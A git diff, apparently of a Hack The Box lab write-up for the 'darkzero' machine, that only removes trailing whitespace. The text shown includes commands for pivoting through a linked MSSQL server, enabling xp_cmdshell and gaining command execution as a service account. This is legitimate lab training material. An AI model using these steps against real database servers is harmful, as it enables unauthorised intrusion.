@@ -96,7 +96,7 @@ That's a whole lot of information. It consists of all basic Active Directory ser
 Let's add Domain name and Computer name in our hosts file.
 
 ```bash
-kali@kali:cat /etc/hosts                                                                                                                                       
+kali@kali:cat /etc/hosts
 10.129.21.48    darkzero.htb dc01.darkzero.htb
 
 127.0.0.1       localhost
@@ -155,13 +155,13 @@ This is a significant find. We’ve identified a Linked Server pointing to an ex
 SQL (darkzero\john.w  guest@master)> use_link [DC02.darkzero.ext]
 SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
 INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
-INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.                                        
-SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami 
-output                 
---------------------   
-darkzero-ext\svc_sql   
-NULL                   
-SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> 
+INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
+output
+--------------------
+darkzero-ext\svc_sql
+NULL
+SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)>
 ```
 
 We have successfully achieved remote code execution on DC02.darkzero.ext as the service account darkzero-ext\svc_sql.
